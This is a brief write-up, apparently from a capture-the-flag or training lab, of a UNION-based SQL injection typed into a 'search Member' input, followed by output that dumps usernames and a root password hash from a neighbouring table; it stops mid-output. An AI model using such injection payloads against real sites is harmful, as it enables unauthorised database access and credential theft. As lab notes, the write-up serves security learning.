So from Member_Sql_Injection we saw a Member_Brute_Force database with db_default table
I concluded Member meant it was for the search Member page.
I ran this command for seeing the content of a neighbour table inside search Member input;

TESTED: 1 OR 1=1 UNION SELECT username,password FROM Member_Brute_Force.db_default 
output:
    First name: one
    Surname : me
    First name: two
    Surname : me

    First name: three
    Surname : me

    First name: Flag
    Surname : GetThe
    First name: root
    Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
    First name: admin
